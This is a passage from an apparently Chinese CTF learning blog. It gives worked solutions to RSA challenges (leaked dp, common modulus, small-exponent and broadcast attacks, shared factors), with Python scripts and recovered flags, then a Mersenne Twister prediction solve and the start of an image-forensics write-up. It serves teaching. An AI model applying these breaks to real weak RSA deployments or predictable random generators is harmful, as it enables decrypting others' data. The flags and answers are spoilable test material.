9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453 p, q = getpq(n, e, d) print(p) print(q) print(fFlag:hashlib.md5(str(p + q).encode(utf-8)).hexdigest())if __name__ == __main__: main() ecndp，求 mimport gmpy2 as gpfrom Crypto.Util.number import long_to_bytese = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751for i in range(1, e): # 在范围(1,e)之间进行遍历 if (dp * e - 1) % i == 0: if n % (((dp * e - 1) // i) + 1) == 0: # 存在p，使得n能被p整除 p = ((dp * e - 1) // i) + 1 q = n // (((dp * e - 1) // i) + 1) phi = (q - 1) * (p - 1) # 欧拉定理 d = gp.invert(e, phi) # 求模逆 m = pow(c, d, n) # 快速求幂取模运算print(m) # 10进制明文print(hex(m)[2:]) # 16进制明文print(long_to_bytes(m)) # 16进制转文本 flagwow_leaking_dp_breaks_rsa?_98924743502 c1c2ne1e2，求 m（共模攻击）使用相同的模数 n 来加密相同的明文 m，使用的指数 e 不同且互质，得到密文 c1 和 c2，可直接解密出密文。 import gmpy2from Crypto.Util.number import bytes_to_long, long_to_bytesn = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361e1 = 11187289c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2 = 9647291r, s1, s2 = gmpy2.gcdext(e1, e2)m = (pow(c1, s1, n) * pow(c2, s2, n)) % nprint(long_to_bytes(m)) # flag49d91077a1abcb14f1a9d546c80be9ef ecn，求 m（n 分解出多个不同的因子） n 比较小，可以进行质因数分解。三个质因数分解为 P17 = 67724172605733871P20 = 11571390939636959887P24 = 694415063702720454699679 import gmpy2from Crypto.Util.number import long_to_bytesn = 544187306850902797629107353619267427694837163600853983242783e = 39293c = 439254895818320413408827022398053685867343267971712332011972p1 = 67724172605733871p2 = 11571390939636959887p3 = 694415063702720454699679phi = (p1 - 1) * (p2 - 1) * (p3 - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m)) # flaga4ffbd7eac428b0fe0 ecn，求 m（e 很短）（低加密指数攻击）m 很短，e 非常小，可用 import gmpy2from Crypto.Util.number import long_to_bytesdef di(c, e, n): k = 0 while True: me = c + n * k flag, result = gmpy2.iroot(me, e) if result == True: return flag k += 1n = int( 52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793, 16,)e = int(3, 16)c = int( 10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365, 16,)m = di(c, e, n)print(long_to_bytes(m)) # flag25df8caf006ee5db94d48144c33b2c3b c1c2c3n1n2n3，求 m（低加密指数广播攻击）根据中国剩余定理，解出答案 import gmpy2from functools import reducefrom Crypto.Util.number import long_to_bytesdef CRT(c, n): sum = 0 # ni 的乘积,N=n1*n2*n3 N = reduce(lambda x, y: x * y, n) # zip()将对象打包成元组 for n_i, c_i in zip(n, c): N_i = N // n_i t_i = gmpy2.invert(N_i, n_i) sum += c_i * N_i * t_i return sum % Nn1 = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004c1 = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243n2 = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114c2 = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344n3 = 332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323c3 = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242n1 = int(str(n1), 5)c1 = int(str(c1), 5)n2 = int(str(n2), 5)c2 = int(str(c2), 5)n3 = int(str(n3), 5)c3 = int(str(c3), 5)n = [n1, n2, n3]c = [c1, c2, c3]x = CRT(c, n)# e一般都不大可以尝试爆破for e in range(1, 10): m, r = gmpy2.iroot(x, e) if r == True: print(long_to_bytes(m)) # noxCTFD4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd! import gmpy2from Crypto.Util.number import long_to_bytese = 65537n0 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c0 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320n1 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c1 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855n2 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c2 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862n3 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c3 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613n4 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c4 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357n5 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c5 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932n6 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c6 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179n7 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c7 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006n8 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c8 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934n9 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c9 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869n10 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c10 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467n11 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c11 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971n12 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c12 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175n13 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c13 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457n14 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c14 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842n15 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c15 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724n16 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c16 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024n17 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c17 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887n18 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c18 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889n19 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c19 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346n = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]c = [c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19]for i in range(len(n)): for j in range(len(n)): if i != j: if gmpy2.gcd(n[i], n[j]) != 1: p = gmpy2.gcd(n[i], n[j]) q = n[i] // p d = gmpy2.invert(e, (p - 1) * (q - 1)) m = pow(c[i], d, n[i])print(long_to_bytes(int(m))) # flagabdcbe5fd94e23b3de429223ab9c2fdf 5. Base 家族编码 Base 描述 等号填充情况 base16 大写字母（A-Z）和数字（0-9） 通常不需要“”填充 base32 大写字母（A-Z）和数字（2-7） 需要“”填充 base64 大小写字母（a-Z）和数字（0-9）以及特殊字符（+,/） 不满 3 的倍数用“”补齐 base58 同 base64 相比，少了数字0和字母O数字1和字母I以及+和/符号 没有“” base85 有很多奇怪的符号 一般没有“” base91 由 91 个字符（0-9，a-z，A-Z,A-Z,!#$%()*+,.:;?@[]^_{ }~”）与运算符 组成 有“＝” base100 全是 emoji 表情。 没有“” 6. 随机数算法分析原理Python 中内置了一个 random 库，用来产生随机数其内置的算法为梅森算法（Mersenne Twister）。 梅森旋转算法可以产生高质量的伪随机数，并且效率高效，弥补了传统伪随机数生成器的不足。梅森旋转算法的最长周期取自一个梅森素数:2^19937 -1。由此命名为梅森旋转算法。常见的两种为基于 32 位的 MT19937-32 和基于 64 位的 MT19937-64。 只要超过梅森素数，我们即可重新回到生成体系中来 MT19973 算法能生成 1-623 个 32 位随机数，而我们有 (3232+6432+9632)*104624 个已知随机数，那么我们就完全可以求出下一个随机数。 例题梅森算法-MT19973例题1 import randomfrom hashlib import md5def get_mask(): file = open(random.txt,w) for i in range(104): file.write(str(random.getrandbits(32))+ ) file.write(str(random.getrandbits(64))+ ) file.write(str(random.getrandbits(96))+ ) file.close()get_mask()flag = md5(str(random.getrandbits(32)).encode()).hexdigest()print(flag) 附件 random.txt（里面有很多随机数） 梅森算法-MT19973解析1 漏洞在于这个函数：random.getrandbits(32)可以直接引用 RandCrack 库，将已经生成的 624 个数按顺序传入 RandCrack 函数里，利用 predict_getrandbits 来计算出下一个 32 位随机数，再使用 md5 加密一下就可以得到 flag。 from randcrack import RandCrackfrom hashlib import md5with open(rrandom.txt,r) as f: l = f.readlines()l = [int(i.strip()) for i in l] #strip函数用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列，这里就默认为空格arr = []#print(l)for i in range(len(l)): if i %3 == 0: arr.append(l[i]) #第三位数或三的倍数位就是32位数，直接加入 elif i %3 == 1: arr.append(l[i] (2**32-1)) #64位数，包含两个32位数，取第一个32位数，64位与32个1按位与，结果剩下低位32位 arr.append(l[i] 32) #右移32位，保留高位32位 else: arr.append(l[i] (2**32-1)) #保留低32位 arr.append(l[i] (2**64-1)32) #保留中间32位 arr.append(l[i]64) #保留高32位rc = RandCrack() #解题关键函数for i in arr: rc.submit(i) #按顺序传入RandCrack函数flag = rc.predict_getrandbits(32) #预测下一个32位数print(md5(str(flag).encode()).hexdigest()) #md5加密 flag{14c71fec812b754b2061a35a4f6d8421} 参考文章 多表代换加密- 密码学系列之三：DES、AES、IDEA —— 一文搞懂分组密码 RSA 介绍 RSA 算法原理及 CTF 解题 CTF 中 RSA 常见攻击方法 [CTFrandcrack]python 随机数预测模块分析及改进方案 青少年 ctf-random（梅森算法-MT19973）","tags":["CTF","密码学","算法"],"categories":["CTF"]},{"title":"【CTF】Misc图片处理题：ACTF wanna png","path":"//CTF/Misc/image_processing_1.html","content":"考点 Binwalk 分离 盲水印 crypto 解密 hashcat 爆破 docx 隐藏文字 bmp 隐写 解题过程1. Binwalk 分离拿到图片先进行 Binwalk 文件分析，可以看到有个 zip 压缩包，则 Binwalk 分离提取压缩包。 1:PNG image, 440 x 449, 8-bit/color RGB, non-interlaced2:Zlib compressed data, compressed3:Zip archive data, at least v2.0 to extract, compressed size: 192868, uncompressed size: 205062, name: wanan.png4:End of Zip archive, footer length: 22 2. 盲水印进入压缩包后有wanan.png和舔狗日记.crypto两个文件，仔细看则会发现两个图片几乎一样，则容易联想到可能是盲水印。使用随波逐流工具箱或者BlindWaterMark进行双图盲水印（key）解密，得到关键信息 1:ARJXU4MjE0。 wanan.png 为题目图片， wanan2.png 为解压后的图片。 python bwmforpy3.py decode wanan.png wanan2.png out.png 3. crypto 解密.crypto文件使用Encrypto打开，输入前面获取的ARJXU4MjE0，得到三个文件舔狗日记1.docx、舔狗日记2.docx、最终我不想舔了.bmp. word 需要配置打开隐藏文字的格式标记，否则后面无法展示隐藏文字。 打开舔狗日记1.docx，全选文字颜色加深，发现没有异常，使用 Binwalk 文件分析，发现有异常的remember.zip。 Binwalk 文件分析 1:Zip archive data, at least v2.0 to extract, compressed size: 350, uncompressed size: 1432, name: [Content_Types].xml2:Zip archive data, at least v2.0 to extract, name: _rels/3:Zip archive data, at least v2.0 to extract, compressed size: 247, uncompressed size: 737, name: 